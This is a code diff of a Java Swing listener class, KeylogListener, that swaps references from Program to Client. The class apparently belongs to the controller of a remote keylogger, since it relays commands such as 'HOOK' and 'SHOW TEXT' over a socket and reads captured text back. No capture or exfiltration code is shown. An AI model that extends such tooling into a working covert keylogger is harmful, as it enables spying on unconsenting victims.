@@ -7,7 +7,7 @@ import java.io.IOException;
 import javax.swing.JOptionPane;
 import javax.swing.JTextArea;
 
-import program.Program;
+import program.Client;
 import view.ClientDesign;
 import view.KeylogDesign;
 
@@ -36,9 +36,9 @@ public class KeylogListener implements ActionListener{
 		if ("HOOK".equals(scr))
 		{
 			try {
-				Program.out.write(scr);
-				Program.out.newLine();
-				Program.out.flush();
+				Client.out.write(scr);
+				Client.out.newLine();
+				Client.out.flush();
 			} catch (IOException e2) {
 				// TODO Auto-generated catch block
 				e2.printStackTrace();
@@ -51,9 +51,9 @@ public class KeylogListener implements ActionListener{
 		{
 
 			try {
-				Program.out.write(scr);
-				Program.out.newLine();
-				Program.out.flush();
+				Client.out.write(scr);
+				Client.out.newLine();
+				Client.out.flush();
 			} catch (IOException e2) {
 				// TODO Auto-generated catch block
 				e2.printStackTrace();
@@ -64,9 +64,9 @@ public class KeylogListener implements ActionListener{
 		else if ("SHOW TEXT".equals(scr))
 		{
 			try {
-				Program.out.write(scr);
-				Program.out.newLine();
-				Program.out.flush();
+				Client.out.write(scr);
+				Client.out.newLine();
+				Client.out.flush();
 			} catch (IOException e2) {
 				// TODO Auto-generated catch block
 				e2.printStackTrace();
@@ -74,7 +74,7 @@ public class KeylogListener implements ActionListener{
 			
 				String outString = "";
 		        try {
-					outString = Program.in.readLine();
+					outString = Client.in.readLine();
 				} catch (IOException e1) {
 					// TODO Auto-generated catch block
 					e1.printStackTrace();
